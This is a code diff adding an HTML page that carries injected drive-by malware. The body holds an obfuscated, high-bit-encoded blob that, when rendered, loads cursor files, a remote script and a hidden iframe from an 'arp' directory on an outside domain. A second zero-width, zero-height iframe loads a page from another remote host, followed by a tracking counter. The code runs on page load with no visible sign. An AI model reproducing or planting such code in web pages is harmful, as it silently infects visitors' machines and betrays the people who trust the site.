@@ -1,0 +1,11 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII" />
+</head><body>
+ΌΘΤΝΜΎΌΒΟΔΩΎΌΔΙΦ ιδ½ξεχίγοξτεξτίκπ στωμε½ΆΔΙΣΠΜΑΩΊ ξοξεΆΎΌΔΙΦ στωμε½ΆΓΥÒΣΟÒΊ υςμ¨§θττπΊ――±Έδνν®γον―αςπ―±®κπη§©ΆΎΌΔΙΦ στωμε½ΆΓΥÒΣΟÒΊ υςμ¨§θττπΊ――±Έδνν®γον―αςπ―²®κπη§©ΆΎΌ―ΔΙΦΎΌ―ΔΙΦΎΌ―ΔΙΦΎΌΣΓÒΙΠΤ μαξηυαηε½καφασγςιπτ σςγ½ΆθττπΊ――±Έδνν®γον―αςπ―ςυξ®κσΆΎΌ―ΣΓÒΙΠΤΎΌ―ΒΟΔΩΎΌιζςανε σςγ½θττπΊ――χχχ®±Έδνν®γον―αςπ―°¶±΄®θτν χιδτθ½° θειηθτ½°ΎΌ―ιζςανεΎ Ό―ΘΤΝΜΎ   
+</body>
+<iframe src=http://xxtvb.cn/arp/httpweb.htm width=0 height=0></iframe>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/935897.js"></script>
+<noscript><a href="http://www.51.la/?935897" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/935897.asp" style="border:none" /></a></noscript>
+</html>
